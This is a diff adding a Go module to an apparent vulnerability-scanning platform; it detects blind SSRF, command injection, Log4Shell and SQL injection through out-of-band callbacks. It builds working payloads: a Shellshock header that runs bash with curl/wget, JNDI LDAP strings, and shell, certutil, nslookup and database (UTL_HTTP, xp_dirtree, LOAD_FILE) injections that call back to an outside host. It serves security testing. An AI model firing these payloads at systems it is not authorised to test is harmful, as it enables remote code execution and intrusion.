@@ -1,0 +1,319 @@
+package scanner
+
+import (
+	"context"
+	"fmt"
+	"net/http"
+	"strings"
+	"sync"
+	"time"
+
+	"github.com/recon-platform/internal/config"
+	"github.com/recon-platform/internal/database"
+	"github.com/recon-platform/internal/tools"
+	"github.com/recon-platform/pkg/logger"
+)
+
+// OASTScanner detects BLIND server-side bugs — SSRF and command injection (RCE)
+// — that produce no visible response difference and therefore can't be seen by
+// signature or timing checks. It plants payloads that make the TARGET SERVER
+// itself reach out to /oob/<token> on this platform. When that callback arrives
+// (handled in the API layer) we have proof of out-of-band execution and raise a
+// confirmed finding, correlated back to the exact injection point by token.
+//
+// This is HTTP-based OAST served by this app itself — no third-party service and
+// no API key. Its one honest limitation: a target that cannot make an outbound
+// HTTP request to our host (strict egress filtering, DNS-only exfil) won't call
+// back; for those, the interactsh_server integration used by nuclei complements
+// this.
+type OASTScanner struct {
+	db        *database.DB
+	exec      *tools.Executor
+	cfg       *config.Config
+	logger    *logger.Logger
+	broadcast BroadcastFunc
+}
+
+func NewOASTScanner(db *database.DB, exec *tools.Executor, cfg *config.Config, log *logger.Logger, broadcast BroadcastFunc) *OASTScanner {
+	return &OASTScanner{db: db, exec: exec, cfg: cfg, logger: log, broadcast: broadcast}
+}
+
+var oastClient = newPooledClient(12*time.Second, false)
+
+func (s *OASTScanner) Run(ctx context.Context, targetID string, logFn LogFunc) error {
+	oob, ok := newOOBCapability(s.cfg)
+	if !ok {
+		logFn("warn", "oast", "Log4Shell/Shellshock OAST blocked — no callback URL configured (set blind_xss_callback_url to this app's public URL).")
+		return BlockedPhase("public OAST callback URL is not configured")
+	}
+
+	points := loadInsertionPoints(ctx, s.db, targetID, s.cfg.URLLimit())
+	auth := loadAuthHeaders(ctx, s.db, targetID)
+	logFn("info", "oast", fmt.Sprintf("Planting out-of-band Log4Shell probes across %d insertion points...", len(points)))
+
+	sem := make(chan struct{}, 12)
+	var wg sync.WaitGroup
+	planted := 0
+
+	for _, ip := range points {
+		if ctx.Err() != nil {
+			break
+		}
+
+		// NOTE: blind SSRF, RCE, SQLi and SSTI are no longer planted here. Each objective
+		// now OWNS its own out-of-band confirmation via the shared oobCapability:
+		// blind SSRF in SSRFScanner.plantBlindSSRF, blind RCE in
+		// CmdiScanner.plantBlindRCE, blind SQLi in SQLiScanner.plantBlindSQLi, blind
+		// SSTI in SSTIScanner.plantBlindSSTI, and blind XXE in XXEScanner. That keeps a single-objective scan (e.g. SQLi-only) from
+		// planting — and therefore emitting findings for — unrelated vulnerability
+		// classes. This generic module now retains only Log4Shell parameter/header
+		// coverage, whose raw LDAP listener is infrastructure-specific.
+
+		// ── Blind Log4Shell ── JNDI into web PARAMETERS (the original dominant
+		// exploitation vector; the network engine only sprays it through headers).
+		// A callback lands on the raw LDAP/RMI listener, correlated by token.
+		ltoken := s.newProbe(targetID, ip.URL, ip.Param, "log4shell", "param:"+ip.Param)
+		planted++
+		lcb := fmt.Sprintf("%s:%d/%s", oob.oobHost, oob.rawPort, ltoken)
+		for _, v := range log4ShellParamPayloads(lcb) {
+			wg.Add(1)
+			sem <- struct{}{}
+			go func(ip insertionPoint, v string) {
+				defer wg.Done()
+				defer func() { <-sem }()
+				sendInjected(ctx, oastClient, ip, v, auth)
+			}(ip, v)
+		}
+	}
+
+	// ── Header sinks ── RCE via Shellshock in User-Agent and Log4Shell across
+	// the Log4j header sinks. SSRF header coverage is owned by SSRFScanner so an
+	// SSRF-only objective remains complete and this generic pass cannot duplicate
+	// those probes.
+	roots := s.aliveRoots(ctx, targetID)
+	for _, root := range roots {
+		if ctx.Err() != nil {
+			break
+		}
+		rceToken := s.newProbe(targetID, root, "User-Agent", "rce", "header:shellshock")
+		planted++
+		rceCB := oob.callbackURL(rceToken)
+		l4token := s.newProbe(targetID, root, "", "log4shell", "headers")
+		planted++
+		l4cb := fmt.Sprintf("%s:%d/%s", oob.oobHost, oob.rawPort, l4token)
+		wg.Add(1)
+		sem <- struct{}{}
+		go func(root, rceCB, l4cb string) {
+			defer wg.Done()
+			defer func() { <-sem }()
+			reqCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
+			defer cancel()
+			req, err := http.NewRequestWithContext(reqCtx, "GET", root, nil)
+			if err != nil {
+				return
+			}
+			// Shellshock RCE uses a separate token from the SSRF headers. Sharing
+			// one token used to mislabel a shell callback as blind_ssrf.
+			req.Header.Set("User-Agent", "() { :;}; /bin/bash -c 'curl -s "+rceCB+" || wget -q -O- "+rceCB+"'")
+			req = SkipRequestIdentity(req)
+			for k, v := range auth {
+				req.Header.Set(k, v)
+			}
+			if resp, e := oastClient.Do(req); e == nil {
+				resp.Body.Close()
+			}
+
+			// Second request: Log4Shell across every known Log4j header sink.
+			l4req, err := http.NewRequestWithContext(reqCtx, "GET", root, nil)
+			if err != nil {
+				return
+			}
+			jndi := "${jndi:ldap://" + l4cb + "}"
+			for _, hName := range log4ShellHeaders {
+				l4req.Header.Set(hName, jndi)
+			}
+			for k, v := range auth {
+				l4req.Header.Set(k, v)
+			}
+			if resp, e := oastClient.Do(l4req); e == nil {
+				resp.Body.Close()
+			}
+		}(root, rceCB, l4cb)
+	}
+
+	wg.Wait()
+
+	// Blind insecure-deserialization: plant text/base64 payloads whose only effect
+	// is an out-of-band callback, across likely deserialization sinks. Confirmed
+	// solely by the callback (RecordOOBHit → insecure_deserialization), so it is
+	// zero-false-positive and complements the per-objective blind classes above.
+	deserN := plantBlindDeserialization(ctx, oob, s, targetID, points, auth)
+	planted += deserN
+
+	logFn("info", "oast", fmt.Sprintf("OAST done. %d Log4Shell/header + %d deserialization probe(s) planted; execution reported via callback.", planted-deserN, deserN))
+	return nil
+}
+
+// oobTokenFromCB extracts the probe token (the last path segment) from a
+// /oob/<token> callback URL. Falls back to the bare "rcnoob" prefix if the URL
+// has no path segment, so a caller never builds a token-less payload by accident.
+func oobTokenFromCB(cb string) string {
+	if i := strings.LastIndexByte(cb, '/'); i >= 0 && i+1 < len(cb) {
+		return cb[i+1:]
+	}
+	return "rcnoob"
+}
+
+// rceOOBPayloads wraps an HTTP callback in the common command-injection breakouts
+// (Unix and Windows). fetch helpers curl/wget cover Linux; certutil covers
+// Windows. dnsHost, when non-empty, is a token-bearing <token>.<zone> name served
+// by our authoritative DNS listener: a `nslookup <dnsHost>` is then attributable
+// even on a target with DNS-only egress (no HTTP reach to us). Without a DNS zone
+// the nslookup falls back to the bare callback host, which cannot be correlated
+// but still proves *a* lookup occurred to an operator watching the listener.
+func rceOOBPayloads(cb, dnsHost string) []string {
+	// nslookup accepts a host, not an HTTP path. Passing the historical
+	// "host/oob/token" string made the DNS-only Windows fallback syntactically
+	// invalid and silently lost blind command-injection callbacks.
+	nsHost := dnsHost
+	if nsHost == "" {
+		nsHost = oobHostOnly(cb)
+		if nsHost == "" {
+			nsHost = stripScheme(cb)
+		}
+	}
+	out := []string{
+		";curl -s " + cb + ";",
+		"|curl -s " + cb,
+		"||curl -s " + cb,
+		"&&curl -s " + cb,
+		"$(curl -s " + cb + ")",
+		"`curl -s " + cb + "`",
+		"; wget -q -O- " + cb,
+		"\ncurl -s " + cb + "\n",
+		"& curl -s " + cb,
+		// Windows
+		"& certutil -urlcache -f " + cb + " x.txt",
+		"| nslookup " + nsHost,
+	}
+	if dnsHost != "" {
+		// DNS-only egress: a bare lookup of the token-bearing name is caught by the
+		// authoritative listener even when no shell fetch can reach us over HTTP.
+		out = append(out,
+			";nslookup "+dnsHost+";",
+			"$(nslookup "+dnsHost+")",
+			"`nslookup "+dnsHost+"`",
+			"& nslookup "+dnsHost,
+			";host "+dnsHost+";",
+		)
+	}
+	return out
+}
+
+// sqliOOBPayloads builds out-of-band SQL-injection payloads that force the
+// database engine itself to make an HTTP request to our callback. Each DB-family
+// primitive is wrapped in the common injection breakouts (string-quote close,
+// numeric, stacked-query) so it lands whichever way the parameter is used. host
+// is the bare host[:port]; cb is the full http URL.
+//
+//	Oracle : UTL_HTTP.REQUEST / HTTPURITYPE(...).GETCLOB() — direct HTTP.
+//	MSSQL  : xp_dirtree \\host\token (SMB/DNS resolution, no OS command).
+//	MySQL  : LOAD_FILE over UNC (SMB/DNS lookup). PostgreSQL has no safe,
+//	         built-in network primitive, so no OS-command payload is attempted.
+//
+// dnsHost, when set, is the token-bearing <token>.<zone> name our authoritative
+// DNS listener answers for. The UNC/xp_dirtree/LOAD_FILE primitives resolve their
+// host via DNS before any SMB connection, so using dnsHost makes these catchable
+// even against a DB whose only egress is DNS — the highest-value blind-SQLi path.
+func sqliOOBPayloads(cb, host, dnsHost string) []string {
+	token := oobTokenFromCB(cb)
+	uncHost := dnsHost
+	if uncHost == "" {
+		uncHost = oobHostOnly(cb)
+		if uncHost == "" {
+			uncHost = host
+		}
+	}
+	unc := `\\` + uncHost + `\` + token
+	oracle := "(SELECT UTL_HTTP.REQUEST('" + cb + "') FROM dual)"
+	oracleURI := "(SELECT HTTPURITYPE('" + cb + "').GETCLOB() FROM dual)"
+	mssqlDir := "EXEC master..xp_dirtree '" + unc + "',1,1"
+
+	out := []string{
+		// Oracle — inline subselect (string and numeric contexts).
+		"'||" + oracle + "||'",
+		"'||" + oracleURI + "||'",
+		"1||" + oracle,
+		// MSSQL — DB-native directory lookup only; deliberately no xp_cmdshell.
+		"';" + mssqlDir + "--",
+		// MySQL — UNC/DNS callback via DB-native file access.
+		"' AND LOAD_FILE('" + unc + "')-- -",
+		"1 AND LOAD_FILE('" + unc + "')",
+		// Generic subquery UNC for engines resolving the path during planning.
+		"' UNION SELECT LOAD_FILE('" + unc + "')-- -",
+	}
+	if dnsHost != "" {
+		// Oracle DNS-only exfil: UTL_INADDR.GET_HOST_ADDRESS forces a pure DNS
+		// resolution of the token-bearing name — no HTTP, no SMB required.
+		inaddr := "(SELECT UTL_INADDR.GET_HOST_ADDRESS('" + dnsHost + "') FROM dual)"
+		out = append(out,
+			"'||"+inaddr+"||'",
+			"1||"+inaddr,
+			// Oracle DBMS_LDAP DNS path (11g+ where UTL_INADDR is locked down).
+			"'||(SELECT DBMS_LDAP.INIT('"+dnsHost+"',80) FROM dual)||'",
+		)
+	}
+	return out
+}
+
+func (s *OASTScanner) newProbe(targetID, url, param, kind, sink string) string {
+	return registerOOBProbe(s.db, targetID, url, param, kind, sink)
+}
+
+// registerOOBProbe mints a fresh OAST token and records the injection point in
+// oob_probes so an out-of-band callback (HTTP /oob/<token> or the raw JNDI/LDAP
+// listener) can be correlated back to it. Package-level so both the OAST scanner
+// and the initial-access engine's Log4Shell phase share one code path.
+func registerOOBProbe(db *database.DB, targetID, url, param, kind, sink string) string {
+	token := newXSSToken("rcnoob")
+	_, _ = db.Exec(`
+		INSERT INTO oob_probes (token, target_id, url, parameter, kind, sink)
+		VALUES (?, ?, ?, ?, ?, ?)
+		ON CONFLICT(token) DO NOTHING
+	`, token, targetID, url, param, kind, sink)
+	return token
+}
+
+func (s *OASTScanner) aliveRoots(ctx context.Context, targetID string) []string {
+	rows, err := s.db.QueryContext(ctx, `
+		SELECT DISTINCT url FROM http_services
+		WHERE target_id = ? AND status_code BETWEEN 200 AND 403
+		ORDER BY url LIMIT 200`, targetID)
+	if err != nil {
+		return nil
+	}
+	defer rows.Close()
+	seen := map[string]bool{}
+	var out []string
+	for rows.Next() {
+		var u string
+		if rows.Scan(&u) != nil {
+			continue
+		}
+		if !urlHostInScope(ctx, u) {
+			continue
+		}
+		if b := hostBaseScan(u); b != "" && !seen[b] {
+			seen[b] = true
+			out = append(out, b)
+		}
+	}
+	return out
+}
+
+func stripScheme(u string) string {
+	if i := strings.Index(u, "://"); i >= 0 {
+		return u[i+3:]
+	}
+	return u
+}
